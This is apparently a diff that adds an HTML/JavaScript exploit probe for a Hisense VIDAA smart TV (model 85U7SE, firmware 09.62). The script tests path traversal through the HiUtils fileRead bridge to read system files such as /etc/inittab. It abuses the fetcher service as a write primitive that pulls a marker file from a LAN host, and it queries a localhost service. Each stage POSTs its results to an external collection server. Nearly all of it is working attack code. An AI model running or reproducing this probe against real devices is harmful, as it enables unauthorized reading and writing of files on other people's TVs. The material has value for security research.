@@ -1,0 +1,82 @@
+<!doctype html>
+<!-- u7probe v1 — VIDAA 09.62 bridge probe for 85U7SE.
+     Reports: UA, bridge presence, hiutils traversal (string + array path),
+     fetcher FaaS availability, superwatch socket, Appinfo registry read.
+     POSTs to /api/probe on the serving origin; output visible on TV screen. -->
+<html><head><meta charset="utf-8"><title>u7probe</title></head>
+<body style="background:#111;color:#0f0;font:14px monospace;padding:12px">
+<pre id="out">u7probe…</pre>
+<script>
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  var rep = { started: new Date().toISOString(), ua: navigator.userAgent,
+              origin: location.origin, bridge: {}, read: {}, fetcher: {}, env: {} };
+  function save(tag) {
+    try { var x = new XMLHttpRequest(); x.open("POST", "http://192.168.0.99:8798/api/probe", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ tag: tag, report: rep })); } catch (e) {}
+  }
+  function line(t) { out.textContent += "\n" + t; }
+  function trunc(s, n) { s = String(s == null ? "" : s); return s.length > n ? s.slice(0, n) + "…(" + s.length + ")" : s; }
+
+  // 1. bridge presence
+  rep.bridge.hiutils_createRequest = typeof HiUtils_createRequest === "function";
+  rep.bridge.WebSDK_createFileRequest = typeof WebSDK_createFileRequest === "function";
+  rep.bridge.vowOS = (typeof vowOS !== "undefined");
+  var hs = []; try { for (var k in window) if (/^Hisense_/.test(k)) hs.push(k); } catch (e) {}
+  rep.bridge.hisense_fns = hs.length;
+  line("ua: " + rep.ua);
+  line("bridge: hiutils=" + rep.bridge.hiutils_createRequest + " websdk=" + rep.bridge.WebSDK_createFileRequest + " vowOS=" + rep.bridge.vowOS + " Hisense_*=" + hs.length);
+  save("start");
+
+  function hi(action, params) {
+    try {
+      if (typeof HiUtils_createRequest === "function") {
+        var r = HiUtils_createRequest(action, params);
+        return (r && typeof r === "object") ? { ret: r.ret, msg: trunc(r.msg, 400) } : { value: trunc(r, 400) };
+      }
+      return { error: "no hiutils" };
+    } catch (e) { return { exc: String(e) }; }
+  }
+
+  // 2. traversal tests — string vs array path
+  var t1 = hi("fileRead", { path: "../proc/uptime", mode: 6 });
+  rep.read.string_uptime = t1; line("[str ../proc/uptime] " + JSON.stringify(t1));
+  var t2 = hi("fileRead", { path: ["../proc/uptime"], mode: 6 });
+  rep.read.array_uptime = t2; line("[arr ../proc/uptime] " + JSON.stringify(t2));
+  var t3 = hi("fileRead", { path: ["../etc/inittab"], mode: 6 });
+  rep.read.array_inittab = t3; line("[arr ../etc/inittab] ret=" + t3.ret + " len=" + ((t3.msg||"").length));
+  var t4 = hi("fileRead", { path: ["../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/package.json"], mode: 6 });
+  rep.read.pkgjson = t4; line("[jsservice.basic pkg.json] ret=" + t4.ret + ": " + trunc(t4.msg, 200));
+  save("read");
+
+  // 3. fetcher FaaS (the write primitive on 09.6x)
+  if (typeof vowOS !== "undefined" && vowOS.service) {
+    try {
+      var f = vowOS.service.syncExecute("basic/fetcher", { api: "fetchFile", args: { url: "http://192.168.0.99:8799/probe_marker.txt", path: ".recon_marker" } });
+      rep.fetcher.start = { ret: f && f.ret, msg: trunc(f && f.msg, 300) };
+    } catch (e) { rep.fetcher.exc = String(e); }
+    line("[fetcher] " + JSON.stringify(rep.fetcher));
+  } else line("[fetcher] no vowOS.service");
+  save("fetcher");
+
+  // 4. Appinfo registry read (mode 6, websdk/Appinfo.json)
+  var ai = hi("fileRead", { path: "websdk/Appinfo.json", mode: 6 });
+  rep.read.appinfo = { ret: ai.ret, len: ((ai.msg||"").length), head: trunc(ai.msg, 200) };
+  line("[Appinfo] " + JSON.stringify(rep.read.appinfo));
+
+  // 5. raw localhost:9009 probe (identifier rotates; try without first as oracle)
+  try {
+    var x = new XMLHttpRequest(); x.open("POST", "http://localhost:9009/service/hiutils", false);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.send(JSON.stringify({ api: "fileRead", args: { mode: 6, path: ["../proc/uptime"] } }));
+    rep.raw9009 = { status: x.status, body: trunc(x.responseText, 300) };
+  } catch (e) { rep.raw9009 = { exc: String(e) }; }
+  line("[raw 9009] " + JSON.stringify(rep.raw9009));
+
+  rep.finished = new Date().toISOString();
+  save("final");
+  line("== done ==");
+})();
+</script></body></html>
